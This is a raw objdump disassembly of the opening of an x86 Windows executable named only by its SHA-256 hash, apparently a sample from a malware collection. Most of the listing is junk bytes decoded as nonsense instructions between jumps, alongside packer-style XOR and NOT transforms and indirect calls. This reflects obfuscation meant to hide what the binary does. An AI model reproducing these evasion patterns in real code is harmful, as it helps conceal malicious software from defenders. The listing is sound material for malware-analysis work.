
fb284ffae0e061d36842fd3d8e385e834aa1e84ef338cb7fb64aed327b19d8e0.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x2c
  401006:	mov    ecx,DWORD PTR ds:0x4292e5
  40100c:	mov    eax,ds:0x4292f5
  401011:	sub    eax,ecx
  401013:	xor    ecx,DWORD PTR [ecx+eax*1]
  401016:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  40101d:	not    ecx
  40101f:	jmp    0x4010ec
  401024:	cdq    
  401025:	data16 cmc 
  401027:	push   edx
  401028:	push   ebp
  401029:	jge    0x4010a4
  40102b:	jge    0x401034
  40102d:	jmp    FWORD PTR [ebx+0x76b27785]
  401033:	fwait
  401034:	jl     0x4010b2
  401036:	jl     0x4010b4
  401038:	lods   al,BYTE PTR ds:[esi]
  401039:	jl     0x4010b7
  40103b:	jl     0x401009
  40103d:	(bad)  
  40103e:	xor    ecx,ebx
  401040:	xor    eax,0xccddcfdb
  401045:	ja     0x4010bd
  401047:	or     ecx,DWORD PTR [esi]
  401049:	xor    ecx,DWORD PTR [edx]
  40104b:	(bad)  
  40104d:	bswap  edx
  40104f:	adc    dh,BYTE PTR [edi]
  401051:	sbb    bl,BYTE PTR [edi]
  401053:	mov    ch,0x52
  401055:	or     ah,BYTE PTR [edi-0x4e10f32f]
  40105b:	rol    esp,cl
  40105d:	or     ecx,DWORD PTR [esp+edx*1+0x4da8e6bc]
  401064:	sbb    DWORD PTR [ecx+0x541fb4dc],esp
  40106a:	out    dx,al
  40106b:	outs   dx,DWORD PTR ds:[esi]
  40106c:	add    ebx,DWORD PTR ds:0x4ac4729e
  401072:	mov    al,ds:0x36dd215b
  401077:	mov    eax,ds:0xa3c97380
  40107d:	je     0x4010b5
  40107f:	fisttp DWORD PTR [ebp+0x359ac4f5]
  401085:	jecxz  0x4010c1
  401087:	and    ebp,0x4f
  40108a:	aam    0x94
  40108c:	dec    ebp
  40108d:	inc    DWORD PTR [edi-0x2f5a886e]
  401093:	mov    cl,0x41
  401095:	loope  0x4010bb
  401097:	pop    ecx
  401098:	sub    edi,DWORD PTR [eax-0x41639320]
  40109e:	jae    0x4010bd
  4010a0:	retf   
  4010a1:	cwde   
  4010a2:	sub    eax,0xc85ce3c6
  4010a7:	(bad)  
  4010a8:	mov    dl,0xfa
  4010aa:	loopne 0x401044
  4010ac:	cmp    eax,0xc76966cf
  4010b1:	sub    al,cl
  4010b3:	or     ch,dl
  4010b5:	sbb    eax,0xb39945d
  4010ba:	outs   dx,DWORD PTR ds:[esi]
  4010bb:	ins    DWORD PTR es:[edi],dx
  4010bc:	jb     0x4010c0
  4010be:	cmp    eax,0x22468cd1
  4010c3:	jns    0x401144
  4010c5:	cmp    al,0x8f
  4010c7:	add    bl,dl
  4010c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4010ca:	add    edx,DWORD PTR [ebx+0x59]
  4010cd:	rol    esp,1
  4010cf:	add    eax,0x15d55edb
  4010d4:	jge    0x401072
  4010d6:	mov    ah,0x43
  4010d8:	daa    
  4010d9:	sbb    DWORD PTR [ebx],esp
  4010db:	addr16 and eax,0x4f3cdb10
  4010e1:	loop   0x4010b1
  4010e3:	xchg   esi,eax
  4010e4:	jo     0x401084
  4010e6:	hlt    
  4010e7:	mov    ds:0x2fc1029d,al
  4010ec:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  4010f3:	mov    eax,0x9507
  4010f8:	add    DWORD PTR ds:0x427cf7,ecx
  4010fe:	jmp    0x4011cb
  401103:	leave  
  401104:	mov    bh,BYTE PTR [edi+esi*4-0x7536b24d]
  40110b:	pop    ebx
  40110c:	mov    dl,0x88
  40110e:	(bad)  
  40110f:	repz out 0x31,al
  401112:	out    dx,al
  401113:	lods   al,BYTE PTR ds:[esi]
  401114:	jl     0x401192
  401116:	jl     0x4010c4
  401118:	jl     0x401196
  40111a:	jl     0x401156
  40111c:	cwde   
  40111d:	sti    
  40111e:	jne    0x40118e
  401120:	jl     0x401151
  401122:	test   BYTE PTR [eax],0x52
  401125:	fist   WORD PTR [ebp-0x65]
  401128:	sub    edi,DWORD PTR [eax-0x6ed5373e]
  40112e:	lock add al,0x9f
  401131:	mov    edi,0x41e84196
  401136:	xor    al,0x3d
  401138:	jne    0x401184
  40113a:	sub    edx,DWORD PTR [esi-0x3d816c53]
  401140:	adc    esi,DWORD PTR [eax-0x2a]
  401143:	les    esi,FWORD PTR [eax+esi*8]
  401146:	jecxz  0x401168
  401148:	jmp    0x31c5:0x4d440d84
  40114f:	hlt    
  401150:	and    al,0x89
  401152:	popf   
  401153:	jmp    0x68cc7d13
  401158:	fwait
  401159:	ja     0x401186
  40115b:	shr    DWORD PTR [edx-0x68],0x57
  40115f:	mov    esp,0x5bbdc17d
  401164:	fcomi  st,st(0)
  401166:	fwait
  401167:	loopne 0x401141
  401169:	int3   
  40116a:	pop    ss
  40116b:	outs   dx,DWORD PTR ds:[esi]
  40116c:	ror    DWORD PTR [esi+0x4a],1
  40116f:	ss xchg esi,eax
  401171:	xlat   BYTE PTR ds:[ebx]
  401172:	hlt    
  401173:	js     0x4010fb
  401175:	sub    eax,0xef8758ba
  40117a:	push   ds
  40117b:	jae    0x4011a0
  40117d:	and    dh,BYTE PTR [ecx]
  40117f:	ja     0x401163
  401181:	test   BYTE PTR [eax+0x0],dh
  401184:	or     edi,DWORD PTR [edx-0x7c44e7c6]
  40118a:	push   edi
  40118b:	cmp    BYTE PTR [edx-0x7d],ch
  40118e:	aad    0xeb
  401190:	xor    ah,ah
  401192:	int    0xc5
  401194:	add    eax,0x6e34d707
  401199:	sahf   
  40119a:	and    BYTE PTR ds:0x5f704697,bh
  4011a0:	int    0x24
  4011a2:	dec    sp
  4011a4:	mov    al,bl
  4011a6:	(bad)  
  4011a7:	fiadd  DWORD PTR [ebx+0x33]
  4011aa:	xlat   BYTE PTR ds:[ebx]
  4011ab:	dec    edx
  4011ac:	pop    ds
  4011ad:	sbb    DWORD PTR [edi-0x2c],edi
  4011b0:	mov    al,0x8c
  4011b2:	mov    dh,0xa0
  4011b4:	add    eax,0x856c4904
  4011b9:	dec    BYTE PTR [edi]
  4011bb:	sub    eax,ecx
  4011bd:	lods   al,BYTE PTR ds:[esi]
  4011be:	sahf   
  4011bf:	sahf   
  4011c0:	in     al,0x4f
  4011c2:	dec    ecx
  4011c3:	jae    0x4011d5
  4011c5:	cmp    ch,BYTE PTR ds:0xdd9e1788
  4011cb:	mov    WORD PTR [ebp-0x4],ax
  4011cf:	lea    eax,[ebp-0x24]
  4011d2:	xor    DWORD PTR ds:0x4275a0,0x226
  4011dc:	mov    DWORD PTR [ebp-0x28],eax
  4011df:	not    DWORD PTR ds:0x4292b5
  4011e5:	mov    eax,DWORD PTR [ebp+0x8]
  4011e8:	movzx  ecx,BYTE PTR ds:0x4275a4
  4011ef:	adc    ecx,DWORD PTR ds:0x4292cd
  4011f5:	mov    DWORD PTR ds:0x4275a4,ecx
  4011fb:	mov    DWORD PTR [ebp-0x20],eax
  4011fe:	xor    DWORD PTR ds:0x42c89e,0x5a6f
  401208:	push   ebx
  401209:	sub    DWORD PTR ds:0x4275a0,ebx
  40120f:	lea    eax,[ebp-0x18]
  401212:	mov    DWORD PTR ds:0x4275ac,0x15
  40121c:	cmp    DWORD PTR ds:0x4275ac,0x0
  401223:	je     0x40124e
  401229:	cmp    DWORD PTR ds:0x4275ac,0x1b
  401230:	jne    0x40123c
  401236:	call   DWORD PTR ds:0x4279b7
  40123c:	mov    ebx,DWORD PTR ds:0x4275ac
  401242:	dec    ebx
  401243:	mov    DWORD PTR ds:0x4275ac,ebx
  401249:	jmp    0x40121c
  40124e:	mov    DWORD PTR [ebp-0x1c],eax
  401251:	movzx  ebx,WORD PTR ds:0x4292c5
  401258:	and    DWORD PTR ds:0x42c896,ebx
  40125e:	mov    eax,DWORD PTR [ebp-0x1c]
  401261:	mov    DWORD PTR ds:0x4292ad,0xc0c
  40126b:	push   esi
  40126c:	push   edi
  40126d:	or     edi,ecx
  40126f:	mov    edi,0xf89f2dad
  401274:	add    ebx,0x5343
  40127a:	mov    DWORD PTR [eax],edi
  40127c:	sub    ecx,DWORD PTR ds:0x427d1f
  401282:	mov    eax,DWORD PTR [ebp-0x14]
  401285:	add    DWORD PTR ds:0x4275a4,0x42c886
  40128f:	mov    ebx,DWORD PTR [ebp-0x8]
  401292:	mov    ecx,0x7510857
  401297:	sbb    DWORD PTR ds:0x427d03,ecx
  40129d:	xor    eax,ecx
  40129f:	mov    esi,0x32729e
  4012a4:	sub    DWORD PTR ds:0x4292b9,0x427cf7
  4012ae:	xor    ebx,ecx
  4012b0:	xor    edx,edx
  4012b2:	add    eax,esi
  4012b4:	adc    DWORD PTR ds:0x4292d5,0x427d07
  4012be:	jmp    0x40138b
  4012c3:	ror    BYTE PTR [edx],0x15
  4012c6:	std    
  4012c7:	std    
  4012c8:	std    
  4012c9:	fsubr  DWORD PTR ds:0xe0012c42
  4012cf:	cmp    DWORD PTR [esi+0x7fdc15f6],0x7cac7c7c
  4012d9:	jl     0x401357
  4012db:	mov    ecx,0xff713d7f
  4012e0:	xchg   edi,eax
  4012e1:	imul   ecx,DWORD PTR [eax+eax*1+0x2b],0x7240f813
  4012e9:	and    dl,dh
  4012eb:	js     0x4012df
  4012ed:	xor    ah,BYTE PTR [edx]
  4012ef:	push   edx
  4012f0:	imul   eax,ecx,0x1
  4012f3:	xchg   BYTE PTR [edx],dh
  4012f5:	sbb    BYTE PTR [edx-0x310ba866],dl
  4012fb:	les    esi,FWORD PTR [esi]
  4012fd:	mov    al,ds:0x577dbb55
  401302:	jnp    0x4012ce
  401304:	je     0x40136d
  401306:	hlt    
  401307:	add    cl,ah
  401309:	sub    eax,0xef8ee2bd
  40130e:	jge    0x40131d
  401310:	or     DWORD PTR [ebx-0x3c9d0802],esp
  401316:	or     al,0x30
  401318:	mov    dl,0x30
  40131a:	fyl2xp1 
  40131c:	inc    ebp
  40131d:	jg     0x401380
  40131f:	idiv   BYTE PTR [edi+0x52e346f7]
  401325:	xchg   ecx,eax
  401326:	inc    ebp
  401327:	fcmove st,st(5)
  401329:	inc    ebx
  40132a:	dec    esi
  40132b:	jnp    0x40138b
  40132d:	sbb    BYTE PTR [eax],dh
  40132f:	adc    dh,BYTE PTR [esi+edi*8-0x1]
  401333:	or     DWORD PTR [ebp+0x5f],ebp
  401336:	loope  0x401349
  401338:	push   ebp
  401339:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40133a:	dec    edi
  40133b:	or     eax,0xd6dc10a0
  401340:	popa   
  401341:	test   BYTE PTR [edx],ah
  401343:	nop
  401344:	mov    ds:0x471dcba4,al
  401349:	cwde   
  40134a:	lock mov cs,WORD PTR [eax+0x57d7e66a]
  401351:	outs   dx,DWORD PTR ds:[esi]
  401352:	repnz and ebp,DWORD PTR ds:0xa70eed93
  401359:	fstp   TBYTE PTR [eax]
  40135b:	(bad)  
  40135c:	xor    ecx,ebp
  40135e:	lds    ecx,FWORD PTR [edi-0x38]
  401361:	pop    es
  401362:	mov    esi,0x6e974fe
  401367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401368:	cmp    ah,BYTE PTR [eax-0x1e]
  40136b:	test   eax,0xebecff5
  401370:	call   0x45c9b8f5
  401375:	or     al,0x92
  401377:	aaa    
  401378:	sbb    ah,BYTE PTR [ebp+0xbb60449]
  40137e:	sahf   
  40137f:	jmp    0x6bc6:0x639ec544
  401386:	ud2    
  401388:	mov    ebp,0xde037053
  40138d:	div    ebx
  40138f:	mov    edx,0x67cd
  401394:	mov    edx,DWORD PTR [ebp-0x20]
  401397:	mov    DWORD PTR [ebp-0x2c],0x4eb5
  40139e:	jmp    0x40146b
  4013a3:	(bad)  
  4013a4:	mov    bl,ch
  4013a6:	nop
  4013a7:	jge    0x40140c
  4013a9:	jns    0x4013f5
  4013ab:	imul   edi,DWORD PTR [ecx-0x290c5e5],0x7e0c90a0
  4013b5:	jl     0x401433
  4013b7:	lods   al,BYTE PTR ds:[esi]
  4013b8:	jl     0x401436
  4013ba:	jl     0x4013b1
  4013bc:	repnz lea eax,[eax-0x4a8511fb]
  4013c3:	retf   0x766d
  4013c6:	jo     0x401390
  4013c8:	mul    DWORD PTR [ecx]
  4013ca:	(bad)  
  4013cb:	rcl    eax,0xe
  4013ce:	scas   eax,DWORD PTR es:[edi]
  4013cf:	inc    esi
  4013d0:	mov    bl,BYTE PTR [esi+0x5f]
  4013d3:	pop    ebp
  4013d4:	pop    ebx
  4013d5:	test   DWORD PTR [edx],0x27842d1b
  4013db:	xchg   DWORD PTR [ecx+0x1c],eax
  4013de:	clc    
  4013df:	jg     0x4013b9
  4013e1:	cmp    BYTE PTR [ecx],bl
  4013e3:	jne    0x401437
  4013e5:	dec    eax
  4013e6:	mov    WORD PTR [ecx-0x4465facb],es
  4013ec:	je     0x401429
  4013ee:	iret   
  4013ef:	std    
  4013f0:	mov    ecx,0xf4d0a584
  4013f5:	bound  edi,QWORD PTR [ebx-0x57]
  4013f8:	imul   edx,DWORD PTR [esi],0x7f4d2f4c
  4013fe:	sti    
  4013ff:	aad    0xc6
  401401:	or     cl,BYTE PTR [esi+0x76]
  401404:	pop    ebp
  401405:	dec    ecx
  401406:	dec    eax
  401407:	sbb    al,0xec
  401409:	xchg   ebp,eax
  40140a:	jbe    0x4013bb
  40140c:	adc    esp,DWORD PTR [edi]
  40140e:	stos   DWORD PTR es:[edi],eax
  40140f:	jl     0x40144f
  401411:	sbb    edx,DWORD PTR [ecx-0x23]
  401414:	add    BYTE PTR [edx],ch
  401416:	stos   DWORD PTR es:[edi],eax
  401417:	dec    ebp
  401418:	lods   al,BYTE PTR ds:[esi]
  401419:	call   0x5c71:0x1f5684b0
  401420:	fs stc 
  401422:	(bad)  
  401423:	in     eax,0x73
  401425:	into   
  401426:	jbe    0x4013bb
  401428:	lds    esp,FWORD PTR [ebx-0x2c0ff9d3]
  40142e:	arpl   WORD PTR [esi-0x708c6fd3],bx
  401434:	ret    
  401435:	xor    al,0xb2
  401437:	mov    ds,ecx
  401439:	ins    DWORD PTR es:[edi],dx
  40143a:	pop    ss
  40143b:	mov    esp,0x8d1b0645
  401440:	adc    ebp,ebx
  401442:	mov    dh,0x61
  401444:	aas    
  401445:	push   eax
  401446:	jne    0x401452
  401448:	adc    BYTE PTR [edx],al
  40144a:	jae    0x401479
  40144c:	mov    eax,0x8c59d6e7
  401451:	rcl    BYTE PTR [ebx-0x43],cl
  401454:	sar    DWORD PTR [ecx+0xd1cf83a],1
  40145a:	lods   al,BYTE PTR ds:[esi]
  40145b:	push   ds
  40145c:	out    dx,eax
  40145d:	xlat   BYTE PTR ds:[ebx]
  40145e:	push   ebp
  40145f:	popf   
  401460:	fsub   DWORD PTR [edx+0x23]
  401463:	dec    ecx
  401464:	aam    0x4e
  401466:	outs   dx,BYTE PTR ds:[si]
  401468:	nop
  401469:	fisub  WORD PTR [ebp+0x5c7023b]
  40146f:	xchg   esp,eax
  401470:	jne    0x4014b4
  401472:	add    BYTE PTR [eax+0x11],dh
  401475:	add    BYTE PTR [eax],al
  401477:	je     0x40195a
  40147d:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401484:	sub    DWORD PTR ds:0x42759c,edx
  40148a:	lea    eax,[ebp-0xc]
  40148d:	mov    DWORD PTR [ebp-0x10],eax
  401490:	sub    edx,eax
  401492:	mov    eax,DWORD PTR [ebp-0x10]
  401495:	not    edx
  401497:	mov    edx,DWORD PTR [eax]
  401499:	imul   edx,edx,0xf89ea9e0
  40149f:	mov    DWORD PTR ds:0x42c88a,0x7964
  4014a9:	mov    DWORD PTR [eax],edx
  4014ab:	mov    DWORD PTR ds:0x4292d9,0x7646
  4014b5:	mov    eax,DWORD PTR [ebp-0xc]
  4014b8:	cmp    eax,0x1fe34420
  4014bd:	mov    DWORD PTR ds:0x4292d5,0x4bbf
  4014c7:	je     0x401629
  4014cd:	and    ebx,0x6650
  4014d3:	jmp    0x4015a0
  4014d8:	cs scas eax,DWORD PTR es:[edi]
  4014da:	inc    ebp
  4014db:	add    eax,0xa36ee545
  4014e0:	sbb    DWORD PTR [edi+0x6100e5e0],ebx
  4014e6:	repz pushf 
  4014e8:	mov    esp,0xac7c7c7e
  4014ed:	jl     0x40156b
  4014ef:	jl     0x401512
  4014f1:	mov    esp,DWORD PTR [eax]
  4014f3:	mov    BYTE PTR [edx-0x62d35555],ah
  4014f9:	xor    dl,BYTE PTR ds:0xbc5db0ac
  4014ff:	inc    ecx
  401500:	mov    eax,ds:0xd9c2007
  401505:	dec    eax
  401506:	xchg   DWORD PTR [eax],ebp
  401508:	dec    edi
  401509:	dec    BYTE PTR [eax]
  40150b:	retf   
  40150c:	push   esi
  40150d:	lea    esi,ds:0x6d982e46
  401513:	gs jecxz 0x40155a
  401516:	into   
  401517:	push   edx
  401518:	cli    
  401519:	mov    dl,0xca
  40151b:	inc    eax
  40151c:	div    DWORD PTR [edx]
  40151e:	aas    
  40151f:	cld    
  401520:	ret    
  401521:	jp     0x4014bd
  401523:	push   0xad061ed5
  401528:	sbb    al,0x2d
  40152a:	add    al,0x33
  40152c:	retf   0x1dd0
  40152f:	idiv   BYTE PTR [edi+esi*4-0x25]
  401533:	push   ds
  401534:	push   ebx
  401535:	push   ss
  401536:	cmp    ecx,DWORD PTR [ebx+0x2f4de6ee]
  40153c:	jae    0x401562
  40153e:	jl     0x4014e1
  401540:	adc    DWORD PTR [ebx],esi
  401542:	xor    BYTE PTR [ecx+eiz*2-0x555678c4],dl
  401549:	add    eax,0x741c6de2
  40154e:	out    dx,eax
  40154f:	int    0x22
  401551:	je     0x4015ab
  401553:	imul   ecx,DWORD PTR [ecx-0x79],0xffffffe6
  401557:	frstor [ebx]
  401559:	pushf  
  40155a:	shl    DWORD PTR [ecx-0x26],1
  40155d:	int    0x25
  40155f:	pushf  
  401560:	mov    edx,0x770cbdbe
  401565:	cs into 
  401567:	push   esi
  401568:	mov    gs,WORD PTR [ebx-0x6f354806]
  40156e:	fistp  WORD PTR [eax+0x519acdf0]
  401574:	add    DWORD PTR [edx+0x22],eax
  401577:	nop
  401578:	or     al,0xff
  40157a:	imul   esp,esp,0x2b
  40157d:	fild   WORD PTR [edi+0x3695ef9]
  401583:	fisub  WORD PTR [ecx+0x75]
  401586:	fiadd  DWORD PTR [ebp-0x44]
  401589:	cwde   
  40158a:	mov    edi,0xcbc8687b
  40158f:	dec    BYTE PTR [ebx+edi*4-0x60]
  401593:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  401595:	mov    edx,0xea433134
  40159a:	popf   
  40159b:	inc    esp
  40159c:	arpl   bp,bx
  40159e:	sub    edi,DWORD PTR [edi-0x7e1bba75]
  4015a4:	or     BYTE PTR [eax-0x389f8ae4],dl
  4015aa:	add    eax,0x427598
  4015af:	adc    al,0x0
  4015b1:	add    BYTE PTR [eax],al
  4015b3:	cmp    DWORD PTR ds:0x427598,0x0
  4015ba:	je     0x40160a
  4015c0:	cmp    DWORD PTR ds:0x427598,0x6
  4015c7:	jne    0x4015d9
  4015cd:	push   DWORD PTR [ebp-0x1c]
  4015d0:	push   DWORD PTR [ebp-0xc]
  4015d3:	call   DWORD PTR ds:0x427c3f
  4015d9:	cmp    DWORD PTR ds:0x427598,0x7
  4015e0:	jne    0x4015f4
  4015e6:	xor    eax,eax
  4015e8:	xor    eax,DWORD PTR ds:0x427598
  4015ee:	dec    eax
  4015ef:	mov    ds:0x427598,eax
  4015f4:	mov    eax,ds:0x427598
  4015f9:	dec    eax
  4015fa:	mov    ds:0x427598,eax
  4015ff:	jmp    0x4015b3
  401604:	or     DWORD PTR ds:0x427594,edi
  40160a:	mov    eax,DWORD PTR [ebp-0x8]
  40160d:	mov    ebx,DWORD PTR ds:0x427d8c
  401613:	mov    edi,DWORD PTR ds:0x42c8de
  401619:	sub    edi,ebx
  40161b:	sub    ebx,DWORD PTR [ebx+edi*1]
  40161e:	xor    eax,ecx
  401620:	add    eax,esi
  401622:	pop    edi
  401623:	pop    esi
  401624:	pop    ebx
  401625:	leave  
  401626:	ret    0x4
  401629:	mov    eax,DWORD PTR [ebp-0xc]
  40162c:	add    eax,DWORD PTR [ebp-0x18]
  40162f:	cmp    eax,0x188271cd
  401634:	je     0x401648
  40163a:	mov    eax,DWORD PTR [ebp-0x10]
  40163d:	and    DWORD PTR [eax],0x751c9d
  401643:	jmp    0x4015a9
  401648:	mov    eax,DWORD PTR [ebp-0xc]
  40164b:	mov    edx,DWORD PTR [ebp-0x18]
  40164e:	or     eax,edx
  401650:	cmp    eax,0xffff6dad
  401655:	je     0x401669
  40165b:	mov    eax,DWORD PTR [ebp-0x10]
  40165e:	xor    DWORD PTR [eax],0x2650fa8f
  401664:	jmp    0x4015a9
  401669:	mov    ax,WORD PTR [ebp-0x4]
  40166d:	mov    edi,DWORD PTR [ebp+0x8]
  401670:	mov    edi,DWORD PTR [edi]
  401672:	mov    edx,0x8a42
  401677:	xor    ax,dx
  40167a:	mov    edx,0x3b08
  40167f:	add    ax,dx
  401682:	cmp    ax,WORD PTR [edi]
  401685:	je     0x401939
  40168b:	mov    eax,DWORD PTR [ebp-0x14]
  40168e:	xor    eax,ecx
  401690:	add    eax,esi
  401692:	mov    DWORD PTR [ebp-0x24],eax
  401695:	mov    eax,DWORD PTR [ebp-0x28]
  401698:	mov    di,WORD PTR [ebp-0x2c]
  40169c:	mov    ebx,0x8a42
  4016a1:	xor    di,bx
  4016a4:	jmp    0x401771
  4016a9:	pop    ebp
  4016aa:	and    ebx,DWORD PTR [ebp-0x65]
  4016ad:	jge    0x40172c
  4016af:	pop    ebp
  4016b0:	in     eax,0x36
  4016b2:	call   0xbf49:0xda728ca
  4016b9:	in     al,dx
  4016ba:	jno    0x401738
  4016bc:	jl     0x40166a
  4016be:	jl     0x40173c
  4016c0:	jl     0x40173e
  4016c2:	imul   edi,DWORD PTR [ebp-0x830a0cc],0x58
  4016c9:	outs   dx,DWORD PTR ds:[esi]
  4016ca:	and    esi,DWORD PTR ds:0x3662f307
  4016d0:	push   0xffffffa0
  4016d2:	shl    DWORD PTR [ecx],1
  4016d4:	sar    DWORD PTR [edx+0x2416f255],0xed
  4016db:	push   ebp
  4016dc:	loopne 0x401670
  4016de:	ins    DWORD PTR es:[edi],dx
  4016df:	aas    
  4016e0:	retf   0x2a4d
  4016e3:	mov    esp,DWORD PTR ds:0x3186f8d5
  4016e9:	dec    esi
  4016ea:	fisttp DWORD PTR [esp+ecx*4+0x13dbc1c9]
  4016f1:	ss xchg edx,eax
  4016f3:	mov    ah,0xd2
  4016f5:	pop    edi
  4016f6:	(bad)  
  4016f7:	shl    BYTE PTR [ecx+ebp*8-0xe],1
  4016fb:	add    edi,DWORD PTR [eax]
  4016fd:	out    0xf6,al
  4016ff:	sbb    DWORD PTR [edi+eiz*4],0x10
  401703:	popa   
  401704:	mov    ds:0xbf2224fe,eax
  401709:	mov    ebx,0x739b382c
  40170e:	cdq    
  40170f:	mov    dl,0x53
  401711:	lods   eax,DWORD PTR ds:[esi]
  401712:	xchg   esi,eax
  401713:	mov    WORD PTR [esi-0x4a],es
  401716:	ins    DWORD PTR es:[edi],dx
  401717:	pop    ds
  401718:	call   0xe662:0x3d395cb3
  40171f:	es mov edi,0xa215b1a5
  401725:	pusha  
  401726:	inc    esp
  401727:	aas    
  401728:	enter  0x5335,0x41
  40172c:	pop    ebx
  40172d:	xchg   ebp,eax
  40172e:	stos   BYTE PTR es:[edi],al
  40172f:	in     eax,0x5d
  401731:	and    eax,DWORD PTR [edx-0x53]
  401734:	sbb    eax,edi
  401736:	jo     0x401759
  401738:	icebp  
  401739:	in     eax,dx
  40173a:	mov    ch,0x19
  40173c:	adc    eax,0xa70855c2
  401741:	mov    ebp,DWORD PTR [ebx-0x7086e90b]
  401747:	inc    edi
  401748:	xchg   DWORD PTR [ebp+0x2f1c25a],eax
  40174e:	xchg   edi,eax
  40174f:	dec    eax
  401750:	jnp    0x401709
  401752:	xchg   ecx,eax
  401753:	xor    DWORD PTR [ebp-0x24c343f6],ebp
  401759:	lds    edx,FWORD PTR fs:[ebp-0x6a]
  40175d:	sbb    al,0xa5
  40175f:	ret    
  401760:	ins    BYTE PTR es:[edi],dx
  401761:	jg     0x4017d1
  401763:	xchg   ebp,eax
  401764:	rol    DWORD PTR [edi],cl
  401766:	es in  al,dx
  401768:	cmp    dh,BYTE PTR [esi+0x1bef7017]
  40176e:	dec    esp
  40176f:	scas   eax,DWORD PTR es:[edi]
  401770:	xchg   edi,eax
  401771:	add    di,dx
  401774:	movzx  edx,di
  401777:	mov    edi,DWORD PTR [ebp-0x8]
  40177a:	jmp    0x401847
  40177f:	repz shl DWORD PTR [edx+0x55456240],cl
  401786:	jecxz  0x401791
  401788:	push   cs
  401789:	scas   eax,DWORD PTR es:[edi]
  40178a:	rcl    al,1
  40178c:	test   al,0x71
  40178e:	sub    DWORD PTR [eax+esi*2],ebx
  401791:	jl     0x40180f
  401793:	lods   al,BYTE PTR ds:[esi]
  401794:	jl     0x401812
  401796:	jl     0x40171f
  401798:	adc    BYTE PTR [ebx+0x6c354d9e],dh
  40179e:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017a0:	jne    0x40176d
  4017a2:	mov    eax,0x10df123f
  4017a7:	leave  
  4017a8:	arpl   WORD PTR [edx+0x3b],di
  4017ab:	out    dx,eax
  4017ac:	cmp    BYTE PTR [ebx-0x5e16b46f],dl
  4017b2:	adc    al,0xcb
  4017b4:	mov    edi,DWORD PTR [esi-0x3e]
  4017b7:	jne    0x4017a4
  4017b9:	out    dx,al
  4017ba:	cdq    
  4017bb:	in     eax,dx
  4017bc:	dec    edx
  4017bd:	scas   eax,DWORD PTR es:[edi]
  4017be:	std    
  4017bf:	sahf   
  4017c0:	mov    ecx,0xcfcb0f98
  4017c5:	pop    edx
  4017c6:	clc    
  4017c7:	in     eax,dx
  4017c8:	dec    ebx
  4017c9:	imul   ebx,ebp,0x5ce19c27
  4017cf:	aaa    
  4017d0:	push   esi
  4017d1:	(bad)  
  4017d2:	sbb    bp,0x2ce3
  4017d7:	scas   al,BYTE PTR es:[edi]
  4017d8:	sbb    eax,0x14142240
  4017dd:	push   cs
  4017de:	sub    ecx,DWORD PTR [edx-0x74cd26b3]
  4017e4:	mov    esi,0xb31dfa1e
  4017e9:	jns    0x401819
  4017eb:	jmp    0xf22a7731
  4017f0:	cmc    
  4017f1:	imul   eax,DWORD PTR [ecx+edi*4-0x26],0x6f3faab9
  4017f9:	mul    DWORD PTR [ebx]
  4017fb:	sbb    al,bh
  4017fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017fe:	pop    es
  4017ff:	inc    esp
  401800:	sti    
  401801:	ins    BYTE PTR es:[edi],dx
  401802:	mov    ecx,0xd7e28b55
  401807:	or     ch,bh
  401809:	push   edi
  40180a:	shl    BYTE PTR [edi-0x10],cl
  40180d:	retf   0xe834
  401810:	popa   
  401811:	shl    DWORD PTR [ebp*4+0x2540bdf3],0x59
  401819:	adc    edx,DWORD PTR [ecx+0x4d]
  40181c:	xchg   edx,eax
  40181d:	xchg   esp,eax
  40181e:	mov    ebp,0xf468c15
  401823:	jb     0x4017ec
  401825:	xor    eax,0xcb38adb8
  40182a:	push   cs
  40182b:	clc    
  40182c:	jo     0x40182d
  40182e:	jnp    0x40184a
  401830:	shl    BYTE PTR [edx+0x5565b5d4],1
  401836:	sti    
  401837:	jmp    0x8340:0x5911c653
  40183e:	in     al,dx
  40183f:	or     DWORD PTR [edi+0x26af719a],esi
  401845:	imul   esp,DWORD PTR [edi],0x948df933
  40184b:	cmp    bl,BYTE PTR [esi+0x1003272]
  401851:	adc    BYTE PTR [ebx+0x558be045],cl
  401857:	clc    
  401858:	mov    edi,DWORD PTR [ebp-0x24]
  40185b:	xor    edx,ecx
  40185d:	add    edx,esi
  40185f:	imul   edx,edi
  401862:	sub    DWORD PTR [eax],edx
  401864:	jmp    0x401931
  401869:	pop    ebx
  40186a:	jno    0x401829
  40186c:	loope  0x4018eb
  40186e:	jge    0x4018cb
  401870:	lods   eax,DWORD PTR ds:[esi]
  401871:	xlat   BYTE PTR ds:[ebx]
  401872:	mov    bh,0x47
  401874:	jns    0x4018b1
  401876:	js     0x401892
  401878:	bound  ecx,QWORD PTR [eax+esi*2+0x7c]
  40187c:	jl     0x40182a
  40187e:	jl     0x4018fc
  401880:	jl     0x401885
  401882:	inc    esi
  401883:	xchg   edi,eax
  401884:	aam    0x52
  401886:	test   DWORD PTR [edx+edi*4-0x11a2a451],0x34aa02d3
  401891:	or     dh,BYTE PTR fs:[esi-0x45]
  401895:	das    
  401896:	mov    ds:0x33d8d962,al
  40189b:	repnz in eax,dx
  40189d:	in     eax,0x4c
  40189f:	pusha  
  4018a0:	mov    bh,0x22
  4018a2:	push   ebp
  4018a3:	inc    ebx
  4018a4:	ins    DWORD PTR es:[edi],dx
  4018a5:	cli    
  4018a6:	xchg   esi,eax
  4018a7:	jb     0x4018bb
  4018a9:	out    dx,al
  4018aa:	xor    al,BYTE PTR [edi-0xf]
  4018ad:	pop    eax
  4018ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018af:	retf   
  4018b0:	pusha  
  4018b1:	inc    ecx
  4018b2:	fld    QWORD PTR [esi]
  4018b4:	outs   dx,BYTE PTR ds:[esi]
  4018b5:	or     bh,BYTE PTR [ebp-0x60]
  4018b8:	sar    esi,0x87
  4018bb:	mov    cl,0xac
  4018bd:	inc    esi
  4018be:	(bad)  
  4018c1:	push   ebp
